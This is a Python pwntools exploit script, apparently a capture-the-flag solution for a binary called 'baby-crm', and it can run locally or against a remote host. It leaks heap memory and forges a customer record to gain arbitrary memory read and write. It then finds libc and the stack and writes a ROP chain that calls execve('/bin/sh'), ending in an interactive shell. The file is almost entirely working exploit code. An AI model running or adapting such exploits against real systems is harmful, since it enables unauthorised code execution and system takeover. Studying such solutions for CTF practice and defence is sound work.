#!/usr/bin/python
#coding=utf-8
 
from pwn import *
 
e = ELF("../src/baby-crm")
libc = ELF("../src/libc.so.6")
context.binary = e
context.log_level = "info"

is_local = False
is_remote = False
 
if len(sys.argv) == 1:
    is_local = True
    p = process(e.path, env={"LD_PRELOAD": libc.path})
 
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
 
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))

def new_customer(name):
    sla(">", "1")
    sla("Customer name: ", name)

def show_customer(idx):
    sla(">", "3")
    sla("Customer to show:", str(idx))

def change_customer_name(idx, name):
    sla(">", "2")
    sla("Customer to alter: ", str(idx))
    sla(">", "1")
    sla("New name", name)

def alter_noopt(idx):
    sla(">", "2")
    sla("Customer to alter: ", str(idx))
    sla(">", "5")

def add_order(idx, value, description):
    sla(">", "2")
    sla("Customer to alter: ", str(idx))
    sla(">", "3")
    sla("Order value: ", str(value))
    sla(">", "")

def help_order():
    sla(">", "4")
    sla(">", "1")

def edit_order(customer, idx, desc):
    sla(">", "2")
    sla("Customer to alter:", str(customer))
    sla(">", "4")
    sla("Order to edit:", str(idx))
    sla("New description:", desc)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

#debug(cmd= """

#    #b main.cpp:215

#      """)

new_customer("AAAAAAAA")
new_customer("DDDDDDDD")
alter_noopt(0)
help_order()

add_order(1, 1337, "")

show_customer(1)

p.recvline()
leaked_customer = p.recv(0x100)
heap_leak = u64(leaked_customer[0x68:0x70])
sl("1")
sla("Customer name:", "B"*0x40000)


def read64(addr):

    fake_customer = p64(addr) + p64(8) + p64(0x4141414141414141) + leaked_customer[0x58:0x90]
    edit_order(1,0,fake_customer)
    show_customer(0)
    p.recvuntil("Name: ")
    v = p.recv(8)
    return u64(v)


def write64(addr, val):
    fake_customer = p64(addr) + p64(8) + p64(0x4141414141414141) + leaked_customer[0x58:0x90]
    edit_order(1,0,fake_customer)
    change_customer_name(0, val);



leak = read64(heap_leak + 0x198) - 0x10;

log.info("libc rel leak: " + hex(leak))

libc_maybe = (leak + 0x300000) & 0xfffffffffffff000;

log.info("libc maybe: " + hex(libc_maybe))

current_libc_base = libc_maybe;

# while ((read64(current_libc_base)) != 0x03010102464c457f):
#     current_libc_base -= 0x1000

dist = 0x223000
current_libc_base = libc_maybe - 0x300000 + dist
log.info("libc: " + hex(current_libc_base))

# log.info("distance from leak: " + hex(current_libc_base - libc_maybe + 0x300000))

environ = current_libc_base + 0x221200 

stack_leak = read64(environ);

log.info("stack leak: " + hex(stack_leak))

libc.address = current_libc_base
system = libc.symbols['system']
binsh = next(libc.search(b"/bin/sh"));

rop = ROP(libc)
pop_rax = rop.find_gadget(['pop rax', 'ret'])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])

pop_rsi = rop.find_gadget(['pop rsi', 'ret'])
pop_rdx = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])
syscall = rop.find_gadget(['syscall'])

payload = p64(pop_rax.address) + p64(0x3b) + p64(pop_rdi.address)\
        + p64(binsh) + p64(pop_rsi.address) + p64(0) + p64(pop_rdx.address)\
        + p64(0)*2 + p64(syscall.address)

write_target = stack_leak - 0x120

for i in range(0, 0x10, 8):

    write64(write_target, p64(libc.address + 0x0000000000029cd6))
    write_target = write_target + 8;


for i in range(0, len(payload), 8):

    write64(write_target, payload[i:i+8])
    write_target = write_target + 8;

sla(">", "5")
p.interactive()
